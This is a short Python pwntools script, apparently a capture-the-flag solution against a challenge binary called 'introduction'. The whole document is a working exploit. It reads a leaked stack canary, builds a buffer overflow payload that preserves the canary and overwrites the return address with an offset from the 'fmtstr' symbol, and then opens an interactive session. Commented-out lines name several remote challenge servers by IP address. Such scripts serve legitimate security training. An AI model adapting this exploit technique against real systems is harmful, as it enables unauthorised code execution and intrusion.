from pwn import *

context.binary = exe = ELF('./introduction',checksec=False)

p = process(exe.path)
#p = remote('103.245.250.17',30006)
#p = remote('61.28.237.106',30006)
#p = remote('103.245.250.29',30006)

p.recvuntil(b'explained later): ')
canary_leak = int(p.recvline(),16)
log.info("canary leak: " + hex(canary_leak))
#input()
payload = b'A'*72
payload += p64(canary_leak)
payload += b'A'*8
payload += p64(exe.sym['fmtstr']+1036)
p.sendlineafter(b'Now, input something into the char buf array, and I will show you what that looks like on the stack.\n', payload)

p.interactive()